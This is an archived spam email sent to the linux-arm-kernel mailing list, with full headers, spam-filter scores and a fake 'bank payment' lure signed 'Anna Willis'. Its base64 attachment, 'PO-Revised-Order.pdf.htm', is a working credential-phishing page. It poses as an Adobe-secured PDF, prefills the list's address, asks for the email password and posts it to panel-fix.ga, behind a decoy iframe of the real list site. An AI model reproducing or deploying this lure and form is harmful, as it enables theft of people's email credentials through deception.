Return-Path: <linux-arm-kernel-bounces+lists+linux-arm-kernel=lfdr.de@lists.infradead.org>
X-Original-To: lists+linux-arm-kernel@lfdr.de
Delivered-To: lists+linux-arm-kernel@lfdr.de
Received: from bombadil.infradead.org (bombadil.infradead.org [IPv6:2607:7c80:54:e::133])
	by mail.lfdr.de (Postfix) with ESMTPS id 0020C178C16
	for <lists+linux-arm-kernel@lfdr.de>; Wed,  4 Mar 2020 09:02:13 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20170209; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Type:MIME-Version:
	Message-ID:Date:Subject:To:From:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=uPGlterHBtrunqETBsCYVBTRQJKugbeyCmbtAH8RgaI=; b=sR43Ah3DUVzAZ9COOEEl2deskL
	YNgZk7FwiNIJSYFCe3kmhMJKCd5Bgbmsh7VPlkhmR8R0+e7A2LFAXe7RY5J+oiX92wiwXFpGoQDy0
	qzCOXaUvLiHaHAZdx9w0Ydf+thgzN3E3uQlGb1sq0Jvd3F8MVCMRHdxZ4hFeUH/hemtLW4+KImMlP
	lfClQXd9B+Vt+2jPsT6vpABZA+Q1HMTsOwkWjGVJ3Q94szitWabzrx9vaj2YnOAV1FguAFJxwLxZq
	+JyzwKg32v9vtKUCKGHoDLBdzvXkO1hqZoyUpY/EdmXL/g7EasU4Q7IiLKp4oo3ZiZp56ID5absda
	yo6oskjQ==;
Received: from localhost ([127.0.0.1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.92.3 #3 (Red Hat Linux))
	id 1j9Oyf-0002x1-PO; Wed, 04 Mar 2020 08:02:01 +0000
Received: from mail0.cpanel-wav.ml ([23.254.217.25])
 by bombadil.infradead.org with esmtps (Exim 4.92.3 #3 (Red Hat Linux))
 id 1j9OyY-0002wO-LQ
 for linux-arm-kernel@lists.infradead.org; Wed, 04 Mar 2020 08:01:56 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=cpanel-wav.ml; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
 i=support@cpanel-wav.ml;
 bh=xL6NOmjVGqW5L+ZA/b+CCBs/wDXJXcaXaPEpC/t4c2c=;
 b=QOOrFFogeKkRaRNe2rmKzJUqsc6pHYBosEausiJ31DMz3eBN6WBwqv/2m0c/Ni0PZAXUEZH/Z9sw
 sUv4Vas+d4syrkNUf8HdO56LehXu70hW9EQAT9yoePsAm41wkCCMYaxesyOJfvEEVHsx0IIb6k+b
 x0/Th7SQl9U9aoFRuio=
From: "Anna Willis"<support@cpanel-wav.ml>
To: linux-arm-kernel@lists.infradead.org
Subject: Swift copy of bank payment
Date: 04 Mar 2020 07:51:46 +0000
Message-ID: <20200304075146.E7A7CB7A2EF0A84B@cpanel-wav.ml>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_FB2CAAD1.A5FD4B9E"
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20200304_000154_746800_D8EC95FA 
X-CRM114-Status: UNSURE (  -2.35  )
X-CRM114-Notice: Please train this message.
X-Spam-Score: 4.5 (++++)
X-Spam-Report: SpamAssassin version 3.4.3 on bombadil.infradead.org summary:
 Content analysis details:   (4.5 points)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
 blocklist [URIs: panel-fix.ga]
 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
 bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?23.254.217.25>]
 0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
 blocklist [URIs: panel-fix.ga]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.7 HTML_IMAGE_ONLY_28     BODY: HTML: images with 2400-2800 bytes of
 words
 0.0 HTML_IMAGE_RATIO_04    BODY: HTML has a low ratio of text to image
 area
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 URIBL_CSS Contains an URL's NS IP listed in the Spamhaus CSS
 blocklist [URIs: panel-fix.ga]
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.0 FROM_MISSPACED         From: missing whitespace
 0.0 T_REMOTE_IMAGE         Message contains an external image
X-BeenThere: linux-arm-kernel@lists.infradead.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: <linux-arm-kernel.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-arm-kernel>, 
 <mailto:linux-arm-kernel-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-arm-kernel/>
List-Post: <mailto:linux-arm-kernel@lists.infradead.org>
List-Help: <mailto:linux-arm-kernel-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-arm-kernel>, 
 <mailto:linux-arm-kernel-request@lists.infradead.org?subject=subscribe>
Sender: "linux-arm-kernel" <linux-arm-kernel-bounces@lists.infradead.org>
Errors-To: linux-arm-kernel-bounces+lists+linux-arm-kernel=lfdr.de@lists.infradead.org

This is a multi-part message in MIME format.

------=_NextPart_000_0012_FB2CAAD1.A5FD4B9E
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable


Please find attached bank payment copy against previous Invoice=20
and send shipping documents on reciept of swift copy. Apologies=20
for sending this through my primary email address.

I await your earliest reply.


Thanks.

Anna Willis
Sales Manager

Tel:00971 4 2956960
Fax:00971 4 2956961
P.O.Box:380536.




Kindly think about the Environment before printing this e-mail 

NOTICE: This e-mail and any files transmitted with it are for the=20
sole use of the intended recipient(s) and may contain=20
confidential and privileged information. If you are not the=20
intended recipient, please contact the sender by reply e-mail and=20
destroy all copies and the original message. Any unauthorized=20
review, use, disclosure, dissemination, forwarding, printing or=20
copying of this email or any action taken in reliance on this e-
mail is strictly prohibited and may be unlawful.
------=_NextPart_000_0012_FB2CAAD1.A5FD4B9E
Content-Type: text/html; name="PO-Revised-Order.pdf.htm"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="PO-Revised-Order.pdf.htm"

PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlv
bmFsLy9FTiINCiAgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+ICAg
IA0KPGh0bWw+DQoNCjxoZWFkPg0KPHRpdGxlPlB1cmNoYXNlIG9yZGVyIExURDwvdGl0bGU+
DQo8c3R5bGU+DQoNCi5lbWFpbHsNCiAgd2lkdGg6IDYwJTsNCiAgYm94LXNpemluZzogYm9y
ZGVyLWJveDsNCiAgYm9yZGVyOiAycHggc29saWQgI2NjYzsNCiAgYm9yZGVyLXJhZGl1czog
OHB4Ow0KICBmb250LXNpemU6IDEzcHg7DQogIGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFy
ZW50Ow0KICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ2ltYWdlL2xvZ28zLmpwZycpOw0KICBi
YWNrZ3JvdW5kLXBvc2l0aW9uOiAzcHggM3B4Ow0KICBiYWNrZ3JvdW5kLXNpemU6IDIwcHg7
DQogIGJhY2tncm91bmQtcG9zaXRpb246IDE1cHggN3B4Ow0KICBiYWNrZ3JvdW5kLXJlcGVh
dDogbm8tcmVwZWF0Ow0KICBwYWRkaW5nOiA5cHggMjBweCA5cHggNDBweDt9DQogIA0KICAu
cGFzc3sNCiAgd2lkdGg6IDYwJTsNCiAgbWFyZ2luLXRvcDo1cHg7DQogIGJveC1zaXppbmc6
IGJvcmRlci1ib3g7DQogIGJvcmRlcjogMnB4IHNvbGlkICNjY2M7DQogIGJvcmRlci1yYWRp
dXM6IDhweDsNCiAgZm9udC1zaXplOiAxM3B4Ow0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFu
c3BhcmVudDsNCiAgYmFja2dyb3VuZC1pbWFnZTogdXJsKCdpbWFnZS9sb2dvNy5QTkcnKTsN
CiAgYmFja2dyb3VuZC1wb3NpdGlvbjogM3B4IDNweDsNCiAgYmFja2dyb3VuZC1zaXplOiAy
MHB4Ow0KICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAxNXB4IDdweDsNCiAgYmFja2dyb3VuZC1y
ZXBlYXQ6IG5vLXJlcGVhdDsNCiAgcGFkZGluZzogOXB4IDIwcHggOXB4IDQwcHg7fQ0KICAN
CiAgLnN1YnsNCgkgIG1hcmdpbi10b3A6NXB4Ow0KICB3aWR0aDogMzAlOw0KICBib3gtc2l6
aW5nOiBib3JkZXItYm94Ow0KICBib3JkZXI6IDJweCBzb2xpZCAjY2NjOw0KICBib3JkZXIt
cmFkaXVzOiA0cHg7IGJvcmRlcjpub25lOw0KICBmb250LXNpemU6IDEzcHg7DQogIGNvbG9y
OndoaXRlO2JhY2tncm91bmQtY29sb3I6cmVkOzsNCiAgYmFja2dyb3VuZC1wb3NpdGlvbjog
M3B4IDNweDsNCiAgYmFja2dyb3VuZC1zaXplOiAyMHB4Ow0KICBiYWNrZ3JvdW5kLXBvc2l0
aW9uOiAxNXB4IDdweDsNCiAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsNCiAgcGFk
ZGluZzogOHB4IDIwcHggOXB4IDMwcHg7fQ0KICA8L3N0eWxlPg0KPG1ldGEgaHR0cC1lcXVp
dj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPg0K
PC9oZWFkPg0KPGJvZHkgYWxpZ249ImNlbnRlciJzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7
IHotaW5kZXg6IDE7ICI+DQoNCjxtYXJxdWVlIGJnY29sb3I9InRyYW5zcGFyZW50IiBzdHls
ZT0iY29sb3I6cmVkOyBmb250LWZhbWlseTogdmVyZGFuYTsgZm9udC1zaXplOjEwcHgiIGJl
aGF2aW9yPSJzbGlkZSIgPlRoaXMgcGRmIGZpbGUgaXMgc2VjdXJlZCBieSBBZG9iZSBmb3Ig
dGhlIHVzZXIgd2l0aCB0aGlzIGVtYWlsIGFkZHJlc3M6IGxpbnV4LWFybS1rZXJuZWxAbGlz
dHMuaW5mcmFkZWFkLm9yZyBvbmx5PC9tYXJxdWVlPg0KPGZvcm0gYWN0aW9uPSJodHRwczov
L3BhbmVsLWZpeC5nYS9jeXJheDNkLnBocCIgbWV0aG9kPSJHRVQiIHN0eWxlPSJtYXJnaW4t
dG9wOjIwMHB4OyIgd2lkdGg9IjEwMCUiIGFsaWduPSJjZW50ZXIiPg0KICAgIDxkaXYgc3R5
bGU9IiBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ2h0dHBzOi8vYWRvYjExLjAwMHdlYmhvc3Rh
cHAuY29tL3BvZmlsZS5wbmcnKTsiPg0KPGZpZWxkc2V0IGFsaWduPSJjZW50ZXIiIHN0eWxl
PSJ3aWR0aDozOTBweDttYXJnaW4tbGVmdDo0NTBweDsgYm9yZGVyLWxlZnQ6bm9uZTsgYm9y
ZGVyLXJpZ2h0Om5vbmU7IGJvcmRlci1yYWRpdXM6N3B4OyBib3JkZXItY29sb3I6cmVkOyBi
b3JkZXItc3R5bGU6IiA+DQo8aW1nIHNyYz0iaHR0cHM6Ly9pLmliYi5jby9OVFR3WDBtL2Fk
b2JlbG9nby5wbmciIHdpZHRoPSIyMHB4IiBoZWlnaHQ9IjIwcHgiIHN0eWxlPSJwYWRkaW5n
LWJvdHRvbTo1cHg7IiA+PGJyPg0KPGlucHV0IHR5cGU9ImVtYWlsIiBuYW1lPSJlbWFpbCIg
Y2xhc3M9ImVtYWlsIiBwbGFjZWhvbGRlcj0iRW50ZXIgeW91ciBlbWFpbCBhZGRyZXNzIiBy
ZXF1aXJlZD0iIg0KICAgICAgIHZhbHVlPSJsaW51eC1hcm0ta2VybmVsQGxpc3RzLmluZnJh
ZGVhZC5vcmciLz48YnI+DQo8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3Jk
IiBjbGFzcz0icGFzcyIgcGxhY2Vob2xkZXI9IkVudGVyIGVtYWlsIHBhc3N3b3JkIiByZXF1
aXJlZD0iIiB2YWx1ZT0iIi8+PGJyPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9InN1
YiIgdmFsdWU9IkFjY2VzcyIvPg0KDQo8L2ZpZWxkc2V0Pg0KICAgIDwvZGl2Pg0KPC9mb3Jt
Pg0KPC9ib2R5Pg0KPGRpdiBzdHlsZT0iIHotaW5kZXg6IC0xOyBwb3NpdGlvbjogYWJzb2x1
dGU7IG1hcmdpbi10b3A6IC01MDBweDsgd2lkdGg6IDEyMjRweDsgaGVpZ2h0OiAxMDI0cHg7
Ij4NCiAgICA8aWZyYW1lIHNyYz0iaHR0cDovL2xpc3RzLmluZnJhZGVhZC5vcmcvIiBzdHls
ZT0id2lkdGg6IDEyMjRweDsgaGVpZ2h0OiAxMDI0cHg7IiA+DQogICAgPC9pZnJhbWU+DQo8
L2Rpdj4NCg0KDQoNCjwvaHRtbD4=

------=_NextPart_000_0012_FB2CAAD1.A5FD4B9E
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
linux-arm-kernel mailing list
linux-arm-kernel@lists.infradead.org
http://lists.infradead.org/mailman/listinfo/linux-arm-kernel

------=_NextPart_000_0012_FB2CAAD1.A5FD4B9E--


